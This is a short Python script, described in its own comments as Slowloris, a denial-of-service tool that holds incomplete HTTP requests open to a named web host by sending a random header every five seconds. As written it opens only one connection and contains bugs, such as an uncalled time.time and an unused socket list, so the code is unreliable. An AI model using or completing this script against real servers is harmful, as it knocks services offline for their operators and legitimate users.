import socket
import time
import uuid
import signal

socks_list = []

def init_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("tsug0d.com", 80))  # Change port to 80
    s.sendall(b"GET / HTTP/1.1\r\nHost: tsug0d.com\r\n")  # Fix HTTP request format
    return s

def keep_connection():
    a.send(b"X-tsu: %s\r\n" % str(uuid.uuid4()).encode('utf-8'))

a = init_sock()
start = time.time
if __name__ == "__main__":
    while True:
        try:
            keep_connection()
            time.sleep(5)
        except Exception as e:
            end = time.time
            print("Error:", e)
            print(end-start)
            exit()
                


        
# Slowloris is a cyber attack tool used to attack web servers by creating a large number of connections to the target server and maintaining them incompletely.
# This causes the server to become overloaded and unable to serve requests from legitimate clients. 
# This method does not take advantage of vulnerabilities in the server software but instead takes advantage of limits on the number of connections the server can handle simultaneously.